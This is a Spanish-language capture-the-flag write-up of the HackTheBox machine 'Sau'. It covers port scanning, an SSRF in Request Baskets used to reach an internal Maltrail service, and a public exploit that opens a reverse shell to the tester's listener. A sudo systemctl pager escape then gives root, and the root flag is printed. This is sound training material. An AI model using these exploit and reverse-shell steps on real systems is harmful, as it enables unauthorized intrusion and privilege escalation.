# Sau

> 🧠 **Plataforma:** HackTheBox
>
> 💻 **Sistema operativo:** Linux
>
> 🎯 **Nivel:** Easy
>
> ✅ **Estado:** Done
>
> 📘 **Curso eJPT:** yes
>
> 🗓️ **Fecha de creación:** 23 de enero de 2025 20:23
>
> 🌐 **IP:** `10.10.11.224`

---


## Recopilación de información

<aside>
💡

</aside>

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
❯ sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.10.11.224 -oG allports

PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
55555/tcp open  unknown syn-ack ttl 63

```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
❯ sudo nmap -p22,55555 -sCV 10.10.11.224 -oN targeted

22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)

55555/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sun, 19 Jan 2025 15:08:43 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sun, 19 Jan 2025 15:08:06 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sun, 19 Jan 2025 15:08:07 GMT
|_    Content-Length: 0

```

- **Identificación de vulnerabilidades**
    - 22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
    - 55555/tcp open  unknown

Despues de estancarnos con la explotacion del SSRF, vemos en las notas que en la enumeración aparecen filtrados los puerots 80 y 8338 usando el parametro -sT o -sS no aparecen, como ha sido nuestro caso.

```php
nmap -p- --min-rate=1000 -T4 10.10.11.224 -vvv

PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 63
80/tcp    filtered http    no-response
8338/tcp  filtered unknown no-response
55555/tcp open     unknown syn-ack ttl 63
```

- **Enumeracion Web (55555)**
    
    ![image.png](<imagenes/image 103.png>)
    

Whateweb

```php
whatweb 10.10.11.224

http://10.10.11.224:55555 [302 Found] Country[RESERVED][ZZ], IP[10.10.11.224], RedirectLocation[/web]
http://10.10.11.224:55555/web [200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, IP[10.10.11.224], JQuery[3.2.1], PasswordField, Script, Title[Request Baskets]
```

En la web vemos que se esta usando : request-basket 1.2.1 y que es vulnerable a SSRF 

![image.png](<imagenes/image 104.png>)

Probamos el SSRF enviando una peticion y mediante la redireccion del proxy a nuestra maquina, ver si recibimos la solicitud

Creamos un basquet, nos ponemos en escucha, modificamos el proxy y usamos curl para hacer la peticion

![image.png](<imagenes/image 105.png>)

```php
curl http://10.10.11.224:55555/2ck6d2 (basket-id)
```

![image.png](<imagenes/image 106.png>)

Ahora lo que queremos es, ya que hemos encontrado un puerto 80 filtrado, ver si mediante el SSRF podemos enumerarlo, modificando la redireccion del Proxy al puerto 80 de la propia maquina

```php
 URL to http://127.0.0.1:80 
```

![image.png](<imagenes/image 107.png>)

Accedemos de nuevo al basquet que hemos creado, esta vez en nuetro navegador y vemos el puerto 80 de la maquina victima

![image.png](<imagenes/image 108.png>)

## Explotación

<aside>
💡

</aside>

### Explotación 1

Vemos que corre un Maltrail v 0.53 

Buscamos si es vulnerable

Encontramos un exploit :

```php
git clone https://github.com/spookier/Maltrail-v0.53-Exploit.git    

>python3 exploit.py 10.10.16.18 4444 http://10.10.11.224:55555/nib90of

❯ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.18] from (UNKNOWN) [10.10.11.224] 36296
$ whoami
puma
```

Hacemos tratamiento de TTY

Buscamos privilegios

```php
sudo -l 
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
puma@sau:/opt/maltrail$ 
```

## Explotación posterior

<aside>
💡

</aside>

### Escalada de privilegios

Buscamos en GTFObins :

```bash
sudo systemctl
!sh
```

Aun sin tener el password de Puma, como podemos correr todo el comando sin password hacemos:

```bash
$ sudo /usr/bin/systemctl status trail.service
  Memory: 34.3M
     CGroup: /system.slice/trail.service
             ├─ 897 /usr/bin/python3 server.py
             ├─1171 /bin/sh -c logger -p auth.info -t "maltrail[897]" "Failed p>
             ├─1172 /bin/sh -c logger -p auth.info -t "maltrail[897]" "Failed p>
             ├─1178 sh
             ├─1182 python3 -c import socket,os,pty;s=socket.socket(socket.AF_I>
             ├─1183 /bin/sh
             ├─1191 sudo systemctl
             ├─1194 /bin/sh -c logger -p auth.info -t "maltrail[897]" "Failed p>
             ├─1195 /bin/sh -c logger -p auth.info -t "maltrail[897]" "Failed p>
             ├─1198 sh
             ├─1199 python3 -c import socket,os,pty;s=socket.socket(socket.AF_I>
             ├─1200 /bin/sh
             ├─1203 script -c bash /dev/null
             ├─1204 bash
lines 1-23!sshh!sh
# whoami
root
# cat root.txt
59c3dd6748dd8fc2ba0ebd557ea5890b
```

# 

## Conclusión

<aside>
💡 Maquina que me ha costado y he tenido que mirar writeup por desconocer como funciona correctamente el SSRF. Escalada de privilegios sin problemas.

</aside>